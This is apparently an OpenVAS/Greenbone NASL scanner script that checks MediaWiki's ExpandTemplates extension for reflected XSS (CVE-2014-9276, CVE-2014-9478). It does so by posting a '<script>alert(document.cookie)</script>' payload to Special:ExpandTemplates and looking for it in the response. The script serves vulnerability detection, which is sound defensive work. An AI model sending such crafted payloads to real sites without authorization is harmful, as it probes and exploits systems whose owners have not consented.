# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mediawiki:mediawiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805327");
  script_version("2024-07-16T05:05:43+0000");
  script_cve_id("CVE-2014-9276", "CVE-2014-9478");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-07-16 05:05:43 +0000 (Tue, 16 Jul 2024)");
  script_tag(name:"creation_date", value:"2015-01-23 12:37:41 +0530 (Fri, 23 Jan 2015)");
  script_name("MediaWiki ExpandTemplates Extension < 1.24.1 Multiple Vulnerabilities (Jan 2015) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_mediawiki_http_detect.nasl");
  script_mandatory_keys("mediawiki/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://phabricator.wikimedia.org/T773111");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2015/01/03/13");

  script_tag(name:"summary", value:"The ExpandTemplates extension for MediaWiki is prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"- Multiple flaws exist when'$wgRawHtml' is set to true

  - Input passed via 'wpInput' parameter in the script is not validated before returning it to
  users");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute
  arbitrary script code in a user's browser session within the trust relationship between their
  browser and the server.");

  script_tag(name:"affected", value:"The ExpandTemplates extension for MediaWiki in versions prior
  to 1.24.1.");

  script_tag(name:"solution", value:"Update the ExpandTemplates extension to version 1.24.1 or
  later.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

host = http_host_name(port:port);

res = http_get_cache(item:dir + "/index.php/Special:Version", port:port);

if(res =~ ">ExpandTemplates<") {

  postData = string('contexttitle=&input=<html><script>alert(document.cookie)</script>
                     </html>&removecomments=1&wpEditToken=+\\');
  url = dir + "/index.php/Special:ExpandTemplates";

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Referer: ", url, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData), "\r\n\r\n",
               "\r\n", postData, "\r\n");
  res = http_keepalive_send_recv(port:port, data:req);

  if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< res) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);
